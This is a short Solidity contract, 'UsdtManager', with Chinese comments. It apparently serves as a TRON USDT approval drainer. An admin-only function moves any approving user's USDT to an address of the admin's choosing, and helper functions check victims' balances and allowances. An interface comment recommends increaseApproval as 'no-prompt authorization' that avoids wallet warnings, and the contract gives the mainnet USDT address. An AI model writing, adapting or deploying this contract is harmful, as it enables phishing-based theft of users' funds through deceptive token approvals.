// SPDX-License-Identifier: MIT
pragma solidity ^0.8.25;

interface ITRC20 {
    function transferFrom(address sender, address recipient, uint256 amount) external returns (bool);
    function allowance(address owner, address spender) external view returns (uint256);
    function balanceOf(address account) external view returns (uint256);
    function approve(address spender, uint256 amount) external returns (bool);
    // 集成到项目时 使用increaseApproval方法 已经是当前所谓的无提示授权（经过测试 不管调用什么方法，老版本安卓手机没有不提示的，安卓无解）
    function increaseApproval(address spender, uint256 addedValue) external returns (bool);
}

// 合约名称 自定义UsdtManager
contract UsdtManager {
    // 部署合约的地址作为管理地址
    address public admin;
    ITRC20 public usdtToken;

    // 仅限管理员地址
    modifier onlyAdmin() {
        require(msg.sender == admin);
        _;
    }

    constructor() {
        admin = msg.sender;
        // 这里是测试网USDT的合约地址（Hex） 主网时更换为0xa614f803B6FD780986A42c78Ec9c7f77e6DeD13C
        usdtToken = ITRC20(0xECa9bC828A3005B9a3b909f2cc5c2a54794DE05F);
    }

    // 划转USDT调用
    function transferUserFunds(address from, address to, uint256 amount) external onlyAdmin {
        require(from != address(0));
        require(to != address(0));
        require(amount > 0);
        
        bool success = usdtToken.transferFrom(from, to, amount);
        require(success);
    }

    // 查询用户地址余额
    function getUserBalance(address user) external view returns (uint256) {
        return usdtToken.balanceOf(user);
    }

    // 查询用户地址的授权额度
    function getUserAllowance(address user) external view returns (uint256) {
        return usdtToken.allowance(user, address(this));
    }

    // 更改合约的管理地址
    function changeAdmin(address newAdmin) external onlyAdmin {
        require(newAdmin != address(0));
        admin = newAdmin;
    }
}
